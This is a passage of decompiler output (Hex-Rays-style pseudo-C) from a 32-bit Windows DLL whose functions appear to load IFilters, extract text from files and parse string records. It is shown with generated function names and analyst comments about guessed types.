  __int32 v12; // eax
  unsigned int v13; // ecx
  double v14; // st7
  int v15; // ecx
  int v17; // [esp-14h] [ebp-80h] BYREF
  int v18; // [esp-10h] [ebp-7Ch] BYREF
  int v19; // [esp-Ch] [ebp-78h]
  int v20; // [esp-8h] [ebp-74h] BYREF
  int v21; // [esp-4h] [ebp-70h]
  _DWORD v22[9]; // [esp+10h] [ebp-5Ch] BYREF
  _DWORD v23[9]; // [esp+34h] [ebp-38h] BYREF
  void *v24; // [esp+58h] [ebp-14h]
  int v25; // [esp+5Ch] [ebp-10h]
  int v26; // [esp+68h] [ebp-4h]

  v25 = 0;
  sub_1001AC1E((int)v22);
  v26 = 1;
  sub_1001A969(v22, v23, 1);
  LOBYTE(v26) = 2;
  v21 = v6;
  v20 = v6;
  v24 = &v20;
  sub_1000D372(&v20, (int)a3);
  LOBYTE(v26) = 2;
  sub_1001AAB4(v23, v20, v21);
  if ( sub_1000D65C((int)&unk_10186EDC, (int)a3) )
  {
    v21 = v7;
    v20 = v7;
    sub_1000D372(&v20, (int)a3);
    LOBYTE(v26) = 5;
    v19 = v9;
    v18 = v9;
    v24 = &v18;
    sub_1000D372(&v18, (int)&unk_10186ED4);
    LOBYTE(v26) = 2;
    if ( sub_1002434A(v18, v19, v20, v21) )
    {
      v10 = a4[3];
      v11 = this[5];
      if ( v11 < v10 )
        v10 = v11;
      sub_1000B67C(a4, (int)&v17, 0, v10);
      LOBYTE(v26) = 7;
    }
    else
    {
      v12 = sub_1000D65C((int)&unk_10186ECC, (int)a3);
      if ( v12 )
      {
        sub_10029BC2(v12);
        v21 = v15;
        v20 = v15;
        sub_1000728E(&v20, 0);
        LOBYTE(v26) = 2;
        sub_1004F292((_DWORD *)dword_10182DE8, 113, (int)a3, v20, v21);
        sub_1000B1F3(0, (int)&v17, 0);
        LOBYTE(v26) = 10;
      }
      else
      {
        v14 = (double)(unsigned int)this[5] * 0.2000000029802322;
        v13 = a4[3];
        if ( (double)v13 <= v14 )
          v14 = (double)v13;
        sub_1000B67C(a4, (int)&v17, 0, (unsigned __int64)v14);
        LOBYTE(v26) = 8;
      }
    }
  }
  else
  {
    v8 = (unsigned __int64)((double)(unsigned int)this[5] * 0.5);
    if ( (unsigned int)v8 >= a4[3] )
      LODWORD(v8) = a4[3];
    sub_1000B67C(a4, (int)&v17, 0, v8);
    LOBYTE(v26) = 4;
  }
  LOBYTE(v26) = 2;
  sub_1001AB12(v23, v17, v18, v19, v20, v21);
  sub_1001AD84(v22, (int)a2);
  v25 = 1;
  LOBYTE(v26) = 1;
  sub_1001A9CE((int)v23);
  LOBYTE(v26) = 0;
  sub_1001AC89((int)v22);
  return a2;
}
// 1004723F: variable 'v6' is possibly undefined
// 100472AE: variable 'v7' is possibly undefined
// 100472C0: variable 'v9' is possibly undefined
// 1004738B: variable 'v15' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10047209: using guessed type _DWORD var_5C[9];
// 10047209: using guessed type _DWORD var_38[9];

//----- (10047404) --------------------------------------------------------
int __stdcall sub_10047404(int a1, int a2, _BYTE *a3)
{
  *(_DWORD *)a1 = &off_10103A4C;
  sub_1000D372((_DWORD *)(a1 + 4), a2);
  *(_BYTE *)(a1 + 12) = *a3;
  return a1;
}
// 10103A4C: using guessed type int (__thiscall *off_10103A4C)(void *, char);

//----- (1004743F) --------------------------------------------------------
void *__thiscall sub_1004743F(void *Block, char a2)
{
  sub_10047482(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004745B) --------------------------------------------------------
int __stdcall sub_1004745B(int *a1)
{
  int result; // eax

  result = *a1;
  if ( *a1 )
    return (*(int (__stdcall **)(int))(*(_DWORD *)result + 8))(*a1);
  return result;
}

//----- (10047482) --------------------------------------------------------
int __thiscall sub_10047482(void *this)
{
  *(_DWORD *)this = off_101040F4;
  if ( *((_DWORD *)this + 4) )
    GlobalFree(*((HGLOBAL *)this + 4));
  sub_1004745B((int *)this + 6);
  sub_1004745B((int *)this + 5);
  return sub_1004745B((int *)this + 1);
}
// 101040F4: using guessed type int (__thiscall *off_101040F4[2])(void *Block, char);

//----- (100474F3) --------------------------------------------------------
_DWORD *__usercall sub_100474F3@<eax>(int a1@<eax>, int a2@<ecx>, _DWORD *a3@<esi>)
{
  _DWORD *v3; // edi
  DWORD IFilter; // eax
  bool v5; // zf

  v3 = (_DWORD *)(a2 + 4);
  IFilter = LoadIFilter(*(PCWSTR *)(*(_DWORD *)(a1 + 4) + 12), 0, (void **)(a2 + 4));
  if ( IFilter )
  {
    *a3 = 102;
  }
  else
  {
    v5 = *v3 == 0;
    a3[1] = 0;
    if ( !v5 )
    {
      *a3 = 0;
      return a3;
    }
    *a3 = 103;
    IFilter = GetLastError();
  }
  a3[1] = IFilter;
  return a3;
}

//----- (10047535) --------------------------------------------------------
_DWORD *__usercall sub_10047535@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  int v2; // eax
  int v4[13]; // [esp+4h] [ebp-38h] BYREF

  memset(v4, 0, sizeof(v4));
  while ( 1 )
  {
    v2 = (*(int (__stdcall **)(_DWORD, int *))(**(_DWORD **)(a1 + 4) + 16))(*(_DWORD *)(a1 + 4), v4);
    if ( v2 )
      break;
    if ( v4[2] == 1 )
    {
      *(_DWORD *)(a1 + 12) = v4[3];
      goto LABEL_8;
    }
  }
  if ( v2 != -2147215616 )
  {
    *a2 = 112;
    a2[1] = v2;
    return a2;
  }
  *(_BYTE *)(a1 + 8) = 1;
LABEL_8:
  a2[1] = 0;
  *a2 = 0;
  return a2;
}

//----- (100475A5) --------------------------------------------------------
_DWORD *__thiscall sub_100475A5(int this, _DWORD *a2, int *a3, int a4, _DWORD *a5)
{
  int v6; // eax
  _DWORD *v7; // esi
  _DWORD *result; // eax
  int v10; // eax
  int *v11; // eax
  int v12; // ecx
  int v13; // edx
  int v15; // [esp+10h] [ebp-8h] BYREF
  int v16; // [esp+24h] [ebp+Ch]

  v6 = *(_DWORD *)(this + 4);
  if ( !v6 )
  {
    v7 = a2;
    *a3 = 0;
    *a2 = 100;
LABEL_3:
    v7[1] = 0;
    v7[1] = GetLastError();
    return v7;
  }
  if ( *(_BYTE *)(this + 8) == 1 )
  {
    v7 = a2;
    *a3 = 0;
    *a2 = 1;
    goto LABEL_3;
  }
  v16 = *a3;
  v10 = (*(int (__stdcall **)(int, int *, int))(*(_DWORD *)v6 + 20))(v6, a3, a4);
  if ( v10 == -2147215615 )
  {
    v11 = sub_10047535(this, &v15);
    v12 = *v11;
    v13 = v11[1];
    if ( !*v11 )
    {
      *a3 = v16;
      sub_100475A5(a2, a3, a4, a5);
      return a2;
    }
    result = a2;
    *a3 = 0;
    a2[1] = v13;
  }
  else
  {
    v12 = 0;
    if ( v10 && v10 != 268041 )
    {
      *a3 = 0;
      a2[1] = v10;
      *a2 = 111;
      return a2;
    }
    *a3 *= 2;
    if ( a5 )
      *a5 = *(_DWORD *)(this + 12);
    result = a2;
    a2[1] = 0;
  }
  *result = v12;
  return result;
}

//----- (1004767A) --------------------------------------------------------
int *__userpurge sub_1004767A@<eax>(int *a1@<edi>, int a2, int a3)
{
  DWORD LastError; // eax
  int *v4; // eax
  int v5; // ecx
  bool v6; // zf
  int v7; // edx
  int *v8; // eax
  int v10[3]; // [esp+8h] [ebp-10h] BYREF
  int v11; // [esp+14h] [ebp-4h]

  if ( *(_DWORD *)(a2 + 4) )
  {
    a1[1] = 0;
    *a1 = 101;
    LastError = GetLastError();
  }
  else
  {
    v4 = sub_100474F3(a3, a2, v10);
    v5 = *v4;
    v6 = *v4 == 0;
    v7 = v4[1];
    v11 = v7;
    if ( v6 )
    {
      v8 = sub_10047729(a2, v10);
      v5 = *v8;
      v6 = *v8 == 0;
      v7 = v8[1];
      v11 = v7;
      if ( v6 )
      {
        *a1 &= v5;
        a1[1] &= v5;
        return a1;
      }
    }
    *a1 = v5;
    LastError = v7;
  }
  a1[1] = LastError;
  return a1;
}
// 1004767A: using guessed type int var_10[3];

//----- (100476E1) --------------------------------------------------------
int *__usercall sub_100476E1@<eax>(int a1@<eax>, int *a2@<esi>)
{
  DWORD LastError; // eax
  int *v3; // eax
  DWORD v4; // edx
  int v6; // [esp+10h] [ebp-8h] BYREF

  if ( *(_DWORD *)(a1 + 4) )
  {
    a2[1] = 0;
    *a2 = 101;
    LastError = GetLastError();
  }
  else
  {
    v3 = sub_10047729(a1, &v6);
    v4 = v3[1];
    if ( !*v3 )
    {
      *a2 = 0;
      a2[1] = 0;
      return a2;
    }
    *a2 = *v3;
    LastError = v4;
  }
  a2[1] = LastError;
  return a2;
}

//----- (10047729) --------------------------------------------------------
int *__usercall sub_10047729@<eax>(int a1@<eax>, int *a2@<ebx>)
{
  int v3; // eax
  int v4; // eax
  int v5; // ecx
  int *v6; // eax
  int v8; // [esp+10h] [ebp-8h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  v3 = *(_DWORD *)(a1 + 4);
  v9 = 0;
  v4 = (*(int (__stdcall **)(int, _DWORD, _DWORD, _DWORD, int *))(*(_DWORD *)v3 + 12))(v3, 0, 0, 0, &v9);
  if ( v4 )
  {
    v5 = 110;
  }
  else
  {
    v6 = sub_10047535(a1, &v8);
    v5 = *v6;
    if ( !*v6 )
    {
      *a2 = 0;
      a2[1] = 0;
      return a2;
    }
    v4 = v6[1];
  }
  *a2 = v5;
  a2[1] = v4;
  return a2;
}

//----- (1004777B) --------------------------------------------------------
_DWORD *__userpurge sub_1004777B@<eax>(int a1@<eax>, unsigned int *a2@<esi>, int a3, _DWORD *a4, char a5)
{
  unsigned int v5; // edi
  int *v7; // eax
  int v8; // ecx
  unsigned int v9; // eax
  unsigned int v10; // eax
  _DWORD *result; // eax
  int v12; // [esp+14h] [ebp-10h] BYREF
  unsigned int v13; // [esp+1Ch] [ebp-8h] BYREF

  v5 = *a2;
  *a2 = 0;
  if ( v5 )
  {
    while ( !a5 || v5 >= 2 )
    {
      v13 = v5;
      if ( a5 )
        v13 = v5 - 2;
      v7 = sub_100475A5(a3, &v12, (int *)&v13, a1, 0);
      v8 = *v7;
      if ( *v7 == 1 )
      {
        result = a4;
        *a4 = 0;
        a4[1] = 0;
        return result;
      }
      if ( v8 )
      {
        a4[1] = v7[1];
        *a4 = v8;
        return a4;
      }
      v9 = v13;
      if ( a5 )
      {
        *(_WORD *)(a1 + 2 * (v13 >> 1)) = 13;
        *(_WORD *)(a1 + 2 * (v13 >> 1) + 2) = 10;
        v9 = v13 + 4;
      }
      *a2 += v9;
      v10 = v9 >> 1;
      v5 -= v10;
      a1 += 2 * v10;
      if ( !v5 )
        break;
    }
  }
  result = a4;
  *a4 = 0;
  a4[1] = 2;
  return result;
}

//----- (10047829) --------------------------------------------------------
_DWORD *__stdcall sub_10047829(_DWORD *a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v6[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v7; // [esp+28h] [ebp-4h]

  sub_10042E1B(a1, a2, a3);
  v7 = 0;
  *a1 = &off_101040F8;
  if ( (_BYTE)a4 )
  {
    HIBYTE(a4) = 0;
    v4 = sub_10047404((int)v6, (int)&unk_10186EF4, (_BYTE *)&a4 + 3);
    LOBYTE(v7) = 1;
  }
  else
  {
    HIBYTE(a4) = 1;
    v4 = sub_10047404((int)v6, (int)&unk_10186EEC, (_BYTE *)&a4 + 3);
    LOBYTE(v7) = 2;
  }
  (*(void (__thiscall **)(_DWORD *, int))(a1[1] + 36))(a1 + 1, v4);
  LOBYTE(v7) = 0;
  sub_10037CC9(v6);
  return a1;
}
// 101040F8: using guessed type int (__thiscall *off_101040F8)(void *Block, char);
// 10047829: using guessed type int var_1C[6];

//----- (100478A4) --------------------------------------------------------
int *__thiscall sub_100478A4(int *Block, char a2)
{
  sub_100478C0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100478C0) --------------------------------------------------------
void __thiscall sub_100478C0(int *this)
{
  *this = (int)&off_101040F8;
  sub_10042E6F(this);
}
// 101040F8: using guessed type int (__thiscall *off_101040F8)(void *Block, char);

//----- (100478E4) --------------------------------------------------------
int __userpurge sub_100478E4@<eax>(int a1@<ecx>, _DWORD *a2@<ebp>, void *a3, void *a4, int a5, int a6)
{
  int v7; // esi
  int v8; // ecx
  _DWORD *v9; // ebx
  int v10; // ebx
  unsigned int v11; // ebx
  int v12; // ecx
  wchar_t *v13; // eax
  int v14; // esi
  int *v15; // eax
  _DWORD *v16; // eax
  bool v17; // bl
  int v18; // ecx
  int v19; // eax
  volatile LONG *v20; // edx
  _DWORD *v21; // ecx
  _DWORD *v22; // eax
  int v24; // [esp-28h] [ebp-7Ch]
  unsigned int v25; // [esp-20h] [ebp-74h]
  _DWORD *v26; // [esp-1Ch] [ebp-70h] BYREF
  volatile LONG *v27; // [esp-18h] [ebp-6Ch]
  int v28; // [esp-14h] [ebp-68h] BYREF
  int v29; // [esp-10h] [ebp-64h]
  int v30; // [esp-Ch] [ebp-60h]
  int v31; // [esp-8h] [ebp-5Ch] BYREF
  int v32; // [esp-4h] [ebp-58h]

  a2[19] = 0;
  sub_1001AC1E((int)(a2 - 12));
  *(a2 - 1) = 1;
  sub_1001A969(a2 - 12, a2, 1);
  *((_BYTE *)a2 - 4) = 2;
  sub_100254EB(a2[27], a2 + 15);
  *((_BYTE *)a2 - 4) = 3;
  sub_1000B1F3(0, (int)(a2 - 17), 0);
  *((_BYTE *)a2 - 4) = 4;
  v7 = a2[25];
  v32 = v8;
  v31 = v8;
  a2[21] = &v31;
  sub_1000D372(&v31, v7);
  *((_BYTE *)a2 - 4) = 5;
  *((_BYTE *)a2 - 4) = 4;
  sub_1001AAB4(a2, v31, v32);
  v9 = (_DWORD *)a2[26];
  a2[25] = &v28;
  sub_1000B36F(v9, (int)&v28);
  *((_BYTE *)a2 - 4) = 6;
  *((_BYTE *)a2 - 4) = 4;
  sub_1001AB12(a2, v28, v29, v30, v31, v32);
  v10 = sub_1000DEE8(v7, 0x2Fu);
  if ( v10 > 0 && (unsigned int)sub_10020446(a2) < *(_DWORD *)(a1 + 20) )
  {
    v11 = v10 + 1;
    sub_1000D836(v11, v7, a2 + 11, 0);
    *((_BYTE *)a2 - 4) = 7;
    sub_1000D836(-2, v7, a2 + 13, v11);
    *((_BYTE *)a2 - 4) = 8;
    sub_1000D17D(a2 + 20, &word_10174BA4);
    *((_BYTE *)a2 - 4) = 9;
    v12 = *(_DWORD *)(a2[12] + 12);
    v32 = *(_DWORD *)(a2[14] + 12);
    v31 = v12;
    v13 = (wchar_t *)sub_1000CC40((int)&unk_10174BA8);
    sub_1000D6C3((int)(a2 + 20), v13);
    v14 = 0;
    if ( a2[18] )
    {
      while ( 1 )
      {
        v15 = (int *)(*(int (__thiscall **)(_DWORD *, int))(a2[15] + 44))(a2 + 15, v14);
        v16 = sub_10020765(*v15, a2 + 9);
        *((_BYTE *)a2 - 4) = 10;
        v17 = sub_1000D65C((int)(a2 + 20), (int)v16) == 0;
        *((_BYTE *)a2 - 4) = 9;
        sub_1000D3AD(a2 + 9);
        if ( v17 )
          break;
        if ( (unsigned int)++v14 >= a2[18] )
          goto LABEL_8;
      }
      v32 = v18;
      v31 = v18;
      a2[25] = &v31;
      sub_1000D372(&v31, (int)(a2 + 20));
      *((_BYTE *)a2 - 4) = 11;
      *((_BYTE *)a2 - 4) = 9;
      sub_1001AAB4(a2, v31, v32);
      v19 = (*(int (__thiscall **)(_DWORD *, int))(a2[15] + 44))(a2 + 15, v14);
      v20 = *(volatile LONG **)(v19 + 4);
      a2[25] = &v28;
      v26 = v21;
      v27 = v20;
      v22 = *(_DWORD **)v19;
      a2[26] = &v26;
      v26 = v22;
      InterlockedIncrement(v20);
      *((_BYTE *)a2 - 4) = 12;
      v25 = *(_DWORD *)(a1 + 20);
      v24 = a2[27];
      *((_BYTE *)a2 - 4) = 9;
      sub_10025748(v24, &v28, v25, v26, v27);
      *((_BYTE *)a2 - 4) = 13;
      *((_BYTE *)a2 - 4) = 9;
      sub_1001AB12(a2, v28, v29, v30, v31, v32);
    }
LABEL_8:
    *((_BYTE *)a2 - 4) = 8;
    sub_1000D3AD(a2 + 20);
    *((_BYTE *)a2 - 4) = 7;
    sub_1000D3AD(a2 + 13);
    *((_BYTE *)a2 - 4) = 4;
    sub_1000D3AD(a2 + 11);
  }
  sub_1001AD84(a2 - 12, a2[24]);
  a2[19] = 1;
  *((_BYTE *)a2 - 4) = 3;
  sub_1000B3DF(a2 - 17);
  *((_BYTE *)a2 - 4) = 2;
  sub_10023DCC(a2 + 15);
  *((_BYTE *)a2 - 4) = 1;
  sub_1001A9CE((int)a2);
  *((_BYTE *)a2 - 4) = 0;
  sub_1001AC89((int)(a2 - 12));
  return a2[24];
}
// 1004793E: variable 'v8' is possibly undefined
// 10047A4C: variable 'v18' is possibly undefined
// 10047A83: variable 'v21' is possibly undefined

//----- (10047B39) --------------------------------------------------------
void __thiscall sub_10047B39(int *this)
{
  sub_1000D3AD(this);
}

//----- (10047B57) --------------------------------------------------------
int __stdcall sub_10047B57(int a1, int a2, int a3, volatile LONG **a4, int a5)
{
  unsigned int i; // eax
  void *v6; // eax
  DWORD *v7; // eax
  volatile LONG *v8; // ecx
  volatile LONG *v9; // ecx
  volatile LONG *v10; // ecx
  volatile LONG *v12; // [esp-8h] [ebp-2Ch] BYREF
  int v13; // [esp-4h] [ebp-28h]
  void *Block; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]
  int v16; // [esp+20h] [ebp-4h]

  v16 = 0;
  *(_DWORD *)a1 = off_1010390C;
  *(_BYTE *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = off_100FBF5C;
  v13 = 16;
  v12 = (volatile LONG *)(a1 + 12);
  *(_DWORD *)(a1 + 8) = &off_10103894;
  sub_10018FD5(v12, v13);
  sub_1004AC4A((_DWORD *)(a1 + 28));
  sub_1003BB34((_DWORD *)(a1 + 44));
  v15 = a1 + 80;
  *(_DWORD *)(a1 + 80) = off_100FBF5C;
  v13 = 16;
  v12 = (volatile LONG *)(a1 + 84);
  *(_DWORD *)(a1 + 80) = &off_101039B4;
  sub_1002E3B2(v12, v13);
  Block = (void *)(a1 + 100);
  sub_1000E6CA((_DWORD *)(a1 + 100));
  LOBYTE(v16) = 10;
  *(_DWORD *)(a1 + 100) = &off_10102398;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  sub_1000E6EF(i, (_DWORD *)(a1 + 100));
  sub_1000D372((_DWORD *)(a1 + 116), (int)&a2);
  v13 = 8;
  *(_DWORD *)(a1 + 124) = a5;
  v6 = operator new(v13);
  Block = v6;
  LOBYTE(v16) = 14;
  if ( v6 )
    v7 = sub_1002295F((DWORD *)v6, (DWORD)a4);
  else
    v7 = 0;
  sub_10039112((_DWORD *)(a1 + 128), (int)v7);
  LOBYTE(v16) = 15;
  v13 = (int)v8;
  v12 = v8;
  a4 = &v12;
  sub_1000D372(&v12, (int)&a2);
  LOBYTE(v16) = 15;
  sub_1001187B(a1 + 136, (int)v12, v13);
  LOBYTE(v16) = 17;
  v13 = (int)v9;
  v12 = v9;
  v13 = *(_DWORD *)(a1 + 132);
  v10 = *(volatile LONG **)(a1 + 128);
  a4 = &v12;
  v12 = v10;
  InterlockedIncrement((volatile LONG *)v13);
  LOBYTE(v16) = 17;
  sub_100454FE((void *)(a1 + 136), a1 + 156, a5, (int)v12, (volatile LONG *)v13);
  v16 = -1;
  sub_1000D3AD(&a2);
  return a1;
}
// 10047C4A: variable 'v8' is possibly undefined
// 10047C73: variable 'v9' is possibly undefined
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102398: using guessed type int (__thiscall *off_10102398)(void *Block, char);
// 10103894: using guessed type int (__thiscall *off_10103894)(void *Block, char);
// 1010390C: using guessed type int (__thiscall *off_1010390C[2])(void *Block, char);
// 101039B4: using guessed type int (__thiscall *off_101039B4)(void *Block, char);

//----- (10047CBA) --------------------------------------------------------
_DWORD *__userpurge sub_10047CBA@<eax>(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, _DWORD *a4, int *a5)
{
  _DWORD *v5; // esi
  DWORD LastError; // eax
  void *v8; // eax
  int v9[5]; // [esp+10h] [ebp-58h] BYREF
  _DWORD v10[4]; // [esp+24h] [ebp-44h] BYREF
  _DWORD v11[4]; // [esp+34h] [ebp-34h] BYREF
  int v12; // [esp+44h] [ebp-24h]
  DWORD v13; // [esp+48h] [ebp-20h]
  void *v14[2]; // [esp+4Ch] [ebp-1Ch] BYREF
  int v15; // [esp+64h] [ebp-4h]

  sub_10029BC2(a1);
  v12 = 0;
  v13 = 0;
  v15 = 0;
  v5 = a2;
  sub_10047ECB(a2, v11);
  LOBYTE(v15) = 1;
  if ( v11[3] )
  {
    sub_100460DA(a2 + 39, v10, v11);
    LOBYTE(v15) = 2;
    sub_10037CF0(v10, (int)v14);
    LOBYTE(v15) = 3;
    while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v14[0] + 4))(v14[0]) )
    {
      sub_1004A363(v5);
      LOBYTE(v15) = 4;
      v8 = (void *)(*(int (__thiscall **)(void *))(*(_DWORD *)v14[0] + 12))(v14[0]);
      sub_10045CB5((__int32)v9, v5 + 39, v9, v8);
      LOBYTE(v15) = 5;
      if ( !sub_10047FB7(v9, v5, a4, a5) )
      {
        *a3 = 0;
        a3[1] = 2;
        LOBYTE(v15) = 4;
        sub_1000B3DF(v9);
        LOBYTE(v15) = 2;
        sub_1003406C(v14);
        LOBYTE(v15) = 1;
        sub_10032EA8(v10);
        goto LABEL_3;
      }
      LOBYTE(v15) = 4;
      sub_1000B3DF(v9);
      v15 = 3;
      sub_10042AAB((int)v14[0]);
      v5 = a2;
    }
    LOBYTE(v15) = 2;
    sub_1003406C(v14);
    LOBYTE(v15) = 1;
    sub_10032EA8(v10);
    LOBYTE(v15) = 0;
    sub_10032EA8(v11);
    v15 = -1;
    *a3 = v12;
    a3[1] = v13;
  }
  else
  {
    v14[0] = (void *)400;
    LastError = GetLastError();
    v12 = 400;
    v13 = LastError;
    *a3 = 400;
    a3[1] = LastError;
LABEL_3:
    LOBYTE(v15) = 0;
    sub_10032EA8(v11);
  }
  return a3;
}
// 10182DE8: using guessed type int dword_10182DE8;
// 10047CBA: using guessed type _DWORD var_44[4];
// 10047CBA: using guessed type int var_58[5];

//----- (10047ECB) --------------------------------------------------------
_DWORD *__stdcall sub_10047ECB(_DWORD *a1, _DWORD *a2)
{
  int *v2; // eax
  int v3; // ebx
  int v4; // ecx
  int v6; // [esp-8h] [ebp-44h] BYREF
  int v7; // [esp-4h] [ebp-40h]
  _DWORD v8[4]; // [esp+10h] [ebp-2Ch] BYREF
  int v9; // [esp+20h] [ebp-1Ch] BYREF
  void *v10; // [esp+24h] [ebp-18h]
  int v11; // [esp+28h] [ebp-14h]
  int v12; // [esp+38h] [ebp-4h]

  v11 = 0;
  v2 = sub_10045454(0x7FFFFFFF, 0, &v9);
  v3 = sub_10046B33(dword_1018703C, a1 + 39, *v2, v2[1]);
  if ( v3 == -1 )
  {
    sub_10029BC2(-1);
    v7 = v4;
    v6 = v4;
    v10 = &v6;
    sub_1000728E(&v6, 0);
    v12 = 0;
    sub_1004F292((_DWORD *)dword_10182DE8, 214, (int)(a1 + 29), v6, v7);
    sub_10032E71(a2);
    v12 = 0;
    v11 |= 1u;
  }
  else
  {
    sub_1004A363(a1);
    v10 = (void *)(dword_10187048 + v3);
    v12 = 2;
    sub_1004664E(a1 + 39, v8, dword_10187048 + v3);
    LOBYTE(v12) = 3;
    sub_10039511(a2, (int)v8);
    v11 |= 1u;
    LOBYTE(v12) = 2;
    sub_10032EA8(v8);
  }
  return a2;
}
// 10047F3F: conditional instruction was optimized away because ebx.4==FFFFFFFF
// 10047F0F: variable 'v4' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 1018703C: using guessed type _DWORD dword_1018703C[3];
// 10187048: using guessed type int dword_10187048;
// 10047ECB: using guessed type _DWORD var_2C[4];

//----- (10047FB7) --------------------------------------------------------
char __thiscall sub_10047FB7(_DWORD *this, _DWORD *a2, _DWORD *a3, int *a4)
{
  volatile LONG *v5; // edx
  const void *v6; // ecx
  int v7; // ebx
  int *v8; // eax
  int *v9; // eax
  int v10; // edi
  int *v11; // eax
  int *v12; // eax
  int v13; // edx
  int v14; // eax
  int *v15; // eax
  int v16; // eax
  int *v17; // eax
  int *v18; // eax
  int *v19; // eax
  int *v20; // eax
  int *v21; // eax
  _DWORD *v22; // eax
  bool v23; // al
  int *v24; // eax
  int *v25; // eax
  int *v26; // eax
  int v27; // eax
  int v28; // esi
  int *v29; // eax
  int v30; // eax
  int *v31; // eax
  int v32; // eax
  int *v33; // eax
  _DWORD *v34; // eax
  int *v35; // eax
  _DWORD *v36; // eax
  LONG *v37; // eax
  char *v38; // ecx
  int *v39; // eax
  _DWORD *v40; // eax
  _DWORD *v41; // eax
  int *v42; // eax
  int v43; // eax
  _DWORD *v44; // eax
  int v45; // eax
  _DWORD *v46; // eax
  int *v47; // ecx
  const char *v48; // esi
  int v49; // eax
  int v50; // eax
  _DWORD *v51; // eax
  double v52; // st7
  _DWORD *v53; // eax
  int v54; // eax
  _DWORD *v55; // eax
  _DWORD *v56; // eax
  _DWORD *v57; // eax
  int v58; // eax
  size_t v59; // eax
  int v60; // edx
  unsigned int v61; // ecx
  int v62; // esi
  unsigned int v63; // ebx
  const void *v64; // ecx
  int v65; // eax
  int v66; // ecx
  int v68; // [esp-Ch] [ebp-268h]
  const void *v69; // [esp-8h] [ebp-264h] BYREF
  size_t v70; // [esp-4h] [ebp-260h]
  int v71; // [esp+10h] [ebp-24Ch]
  int v72; // [esp+14h] [ebp-248h]
  char v73; // [esp+1Bh] [ebp-241h]
  int v74; // [esp+1Ch] [ebp-240h]
  char *EndPtr; // [esp+20h] [ebp-23Ch] BYREF
  int v76; // [esp+24h] [ebp-238h]
  int v77; // [esp+28h] [ebp-234h] BYREF
  LONG v78; // [esp+2Ch] [ebp-230h] BYREF
  int v79; // [esp+30h] [ebp-22Ch]
  double v80; // [esp+34h] [ebp-228h] BYREF
  int v81; // [esp+3Ch] [ebp-220h]
  int v82; // [esp+40h] [ebp-21Ch]
  int Src; // [esp+44h] [ebp-218h] BYREF
  LONG v84; // [esp+48h] [ebp-214h] BYREF
  double v85; // [esp+4Ch] [ebp-210h] BYREF
  int v86; // [esp+54h] [ebp-208h]
  int v87; // [esp+58h] [ebp-204h] BYREF
  LONG v88; // [esp+5Ch] [ebp-200h] BYREF
  int v89[2]; // [esp+60h] [ebp-1FCh] BYREF
  int v90; // [esp+68h] [ebp-1F4h]
  int v91[2]; // [esp+6Ch] [ebp-1F0h] BYREF
  int v92[2]; // [esp+74h] [ebp-1E8h] BYREF
  int v93[9]; // [esp+7Ch] [ebp-1E0h] BYREF
  int v94[2]; // [esp+A0h] [ebp-1BCh] BYREF
  int v95[2]; // [esp+A8h] [ebp-1B4h] BYREF
  int v96[2]; // [esp+B0h] [ebp-1ACh] BYREF
  _DWORD v97[2]; // [esp+B8h] [ebp-1A4h] BYREF
  int v98[2]; // [esp+C0h] [ebp-19Ch] BYREF
  int v99[2]; // [esp+C8h] [ebp-194h] BYREF
  int v100[2]; // [esp+D0h] [ebp-18Ch] BYREF
  int v101[2]; // [esp+D8h] [ebp-184h] BYREF
  int v102[5]; // [esp+E0h] [ebp-17Ch] BYREF
  int v103[2]; // [esp+F4h] [ebp-168h] BYREF
  int v104[26]; // [esp+FCh] [ebp-160h] BYREF
  int v105; // [esp+164h] [ebp-F8h] BYREF
  int v106; // [esp+16Ch] [ebp-F0h] BYREF
  int v107; // [esp+174h] [ebp-E8h] BYREF
  int v108; // [esp+17Ch] [ebp-E0h] BYREF
  int v109; // [esp+184h] [ebp-D8h] BYREF
  int v110; // [esp+18Ch] [ebp-D0h] BYREF
  int v111; // [esp+194h] [ebp-C8h] BYREF
  int v112; // [esp+19Ch] [ebp-C0h] BYREF
  int v113; // [esp+1A4h] [ebp-B8h] BYREF
  int v114; // [esp+1ACh] [ebp-B0h] BYREF
  int v115; // [esp+1B4h] [ebp-A8h] BYREF
  int v116; // [esp+1BCh] [ebp-A0h] BYREF
  int v117; // [esp+1C4h] [ebp-98h] BYREF
  char v118[32]; // [esp+1CCh] [ebp-90h] BYREF
  int v119; // [esp+1ECh] [ebp-70h] BYREF
  int v120; // [esp+1F4h] [ebp-68h] BYREF
  int v121[5]; // [esp+1FCh] [ebp-60h] BYREF
  char v122[20]; // [esp+210h] [ebp-4Ch] BYREF
  int v123[5]; // [esp+224h] [ebp-38h] BYREF
  char v124[24]; // [esp+238h] [ebp-24h] BYREF
  int v125; // [esp+258h] [ebp-4h]

  v72 = 0;
  sub_1001AEB1(this, (int)v118);
  v125 = 0;
  v5 = (volatile LONG *)a2[33];
  v69 = a2 + 32;
  v70 = (size_t)v5;
  v6 = (const void *)a2[32];
  LODWORD(v85) = &v69;
  v69 = v6;
  InterlockedIncrement(v5);
  LOBYTE(v125) = 1;
  v68 = a2[31];
  LOBYTE(v125) = 0;
  sub_100454FE(v118, (int)v104, v68, (int)v69, (volatile LONG *)v70);
  LOBYTE(v125) = 2;
  sub_1004A936(v93);
  LOBYTE(v125) = 3;
  v7 = this[3];
  v80 = 0.0;
  v82 = 0;
  v76 = 0;
  v8 = sub_10045454(v7, 0, v91);
  v86 = sub_10046D48(v104, dword_10186F38, *v8, v8[1]);
  v9 = sub_10045454(v7, 0, v91);
  v10 = sub_10046D48(v104, dword_10186F98, *v9, v9[1]);
  v11 = sub_10045454(v7, dword_10186F44 + v86, v91);
